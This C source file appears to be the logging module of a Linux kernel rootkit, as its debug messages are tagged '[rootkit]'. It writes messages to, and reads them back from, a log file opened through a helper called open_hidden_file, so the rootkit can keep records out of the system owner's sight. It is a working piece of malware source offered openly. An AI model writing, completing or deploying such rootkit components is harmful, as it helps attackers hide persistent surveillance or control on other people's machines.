/*=======================================================================*\
  functions to interect with files.c to provide easy logging capabilities
\*=======================================================================*/

#include "files.c"

struct kern_file *log_file;

static int init_logging(void){//initiates logging ability
	log_file = open_hidden_file("messages.log"); //opens file
	if (log_file==NULL){ //if unable to open
		printk("[log.c::init_logging] ERROR    unable to open log file\n"); //DEBUG
		return -1; //retun -1 for error
	}
	return 0; //return 0 for no error
}

static int close_logging(void){
	file_close(log_file);
	kfree(log_file);
	return 0;
}

static int log_msg(char *message){ //logs message to log_file
	printk("[rootkit][log.c::log] DEBUG    logging message with length %lu	\n\t%s\n", strlen((char *) message), message); //DEBUG
	if (file_write(log_file, (void *) message, strlen((char *) message))!=0){ //writes to file and checks if any error
		printk("[log.c::log] ERROR    file_write unable to write all data\n"); //DEBUG
		return -1;
	}
	return 0;
}

static int get_logs(char *buffer){
	if (file_read(log_file, buffer)!=0){
		return -1;
	}
	return 0;
}
